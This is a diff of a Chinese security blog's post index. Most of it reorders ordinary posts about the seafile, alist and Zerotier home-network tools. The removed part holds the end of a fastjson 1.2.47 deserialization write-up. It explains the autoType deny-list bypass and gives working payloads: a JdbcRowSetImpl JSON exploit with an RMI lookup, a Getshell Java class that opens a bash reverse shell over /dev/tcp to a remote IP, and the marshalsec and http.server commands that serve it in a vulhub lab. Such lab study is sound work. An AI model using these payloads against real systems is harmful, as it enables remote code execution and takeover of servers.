TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;<span class="comment">//黑名单判断</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//从缓存表中查找类名</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;<span class="comment">//在这里就直接返回了clazz</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>查看<code>getClassFromMapping</code>方法,在<code>com.alibaba.fastjson.util.TypeUtils</code>类中</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);<span class="comment">//可以发现获取的是mappings参数的类名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>找一下mappings参数的<code>put方法</code>,发现有两处,第一处是<code>addBaseClassMappings方法</code></p>
-<p><img src="image-20230411180046143.png" alt="image-20230411180046143"></p>
-<p>听名字都知道这里只是将一些基础类放到mappings中,我们无法控制</p>
-<p>另外一处是<code>loadClass方法</code>,loadClass会把传入的类名放到mappings中</p>
-<p><img src="image-20230411180157779.png" alt="image-20230411180157779"></p>
-<p>找一下发现<code>com.alibaba.fastjson.serializer.MiscCodec</code>类调用了loadClass方法</p>
-<p><img src="image-20230411180847428.png" alt="image-20230411180847428"></p>
-<p>而MiscCodec又实现了<code>ObjectSerializer</code>接口,说明它是一个``反序列化器`,</p>
-<p><img src="image-20230411180951750.png" alt="image-20230411180951750"></p>
-<p>然而fastjson的反序列化需要用到反序列化器,这个反序列化器是从config中得到的</p>
-<p><img src="image-20230411181146140.png" alt="image-20230411181146140"></p>
-<p>根据反序列化类的不同调用不同的的反序列化器,如下图中如果反序列化的类是<code>Class类</code>,那么就会调用MiscCodec类这个反序列化器,进而调用loadClass方法</p>
-<p><img src="image-20230411181352396.png" alt="image-20230411181352396"></p>
-<p>再来看看参数的传递,我们要让<code>com.sun.rowset.JdbcRowSetImpl</code>作为参数传入到loadClass方法,在MiscCodec类中传入的是strVal参数,而与strVal参数有关的部分代码为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;<span class="comment">//检查当前解析的 JSON 对象是否为类型名重定向（TypeNameRedirect）</span></span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<span class="comment">//检查下一个标记是否为字符串</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<span class="comment">//校验其值是否为 &quot;val&quot;</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);<span class="comment">//读取下一个 JSON 标记,以跳过冒号（:）分隔符</span></span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();<span class="comment">//使用 parse() 方法解析 JSON 对象的值部分</span></span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">    strVal = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;<span class="comment">//这里将objVal的值给了strVal</span></span><br></pre></td></tr></table></figure>
-<p>为了使最后的strVal等于com.sun.rowset.JdbcRowSetImpl,我们要传入一个<code>val</code>,其值为<code>com.sun.rowset.JdbcRowSetImpl</code></p>
-<p>最后构造poc</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:8085/PxTxVXhC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>命令执行成功</p>
-<p><img src="image-20230411192547329.png" alt="image-20230411192547329"></p>
-<h1 id="vulhub复现">vulhub复现</h1>
-<p>启动靶场（这里打的是1.2.47）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>yakit开个监听端口</p>
-<p><img src="image-20230501212304453.png" alt="image-20230501212304453"></p>
-<p>编写恶意代码Getshell.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Getshell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i&gt;&amp; /dev/tcp/192.168.210.10/2333 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译以后利用python将Getshell.class挂起来</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server 6666</span><br></pre></td></tr></table></figure>
-<p>接下来利用<code>marshalsec</code>启动RMI服务（这里直接用yakit似乎没用）</p>
-<p>项目地址：  <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
-<p>下载以后先用mvn编译</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests </span><br></pre></td></tr></table></figure>
-<p>生成target后运行marshalsec-0.0.3-SNAPSHOT-all.jar</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.59.1:6666/#Getshell&quot; 9999</span><br></pre></td></tr></table></figure>
-<p>构造exp</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.59.1:9999/Getshell&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>burpsuite重放以后发现yakit成功反弹了shell</p>
-<p><img src="image-20230501212216120.png" alt="image-20230501212216120"></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java反序列化之shiro550</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro550/</url>
     <content><![CDATA[<h1 id="环境搭建">环境搭建</h1>
@@ -738,6 +738,60 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反序列化之动态代理,cc1和cc6</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/</url>
     <content><![CDATA[<h1 id="动态代理">动态代理</h1>
@@ -798,57 +852,40 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+    <title>Zerotier的使用体验</title>
+    <url>/post/zerotier/</url>
+    <content><![CDATA[<h1 id="背景">背景</h1>
+<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
+<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
+<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
+<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
+<p><img src="ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
+<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
+<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
+<h1 id="Zerotier">Zerotier</h1>
+<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
+<p><img src="43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h2 id="安装配置">安装配置</h2>
+<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
+<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
+<p>同时centos 的安装可以参照这位大佬的文章</p>
+<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
+<h2 id="体验">体验</h2>
+<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
+<p><img src="d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
+<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
+<h2 id="安全性">安全性</h2>
+<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
+<h1 id="结语">结语</h1>
+<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
+<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
 ]]></content>
       <categories>
         <category>使用体验</category>
       </categories>
       <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
+        <tag>zerotier</tag>
       </tags>
   </entry>
   <entry>
@@ -930,116 +967,57 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
-    <title>Zerotier的使用体验</title>
-    <url>/post/zerotier/</url>
-    <content><![CDATA[<h1 id="背景">背景</h1>
-<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
-<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
-<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
-<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
-<p><img src="ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
-<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
-<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
-<h1 id="Zerotier">Zerotier</h1>
-<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
-<p><img src="43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h2 id="安装配置">安装配置</h2>
-<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
-<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
-<p>同时centos 的安装可以参照这位大佬的文章</p>
-<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
-<h2 id="体验">体验</h2>
-<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
-<p><img src="d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
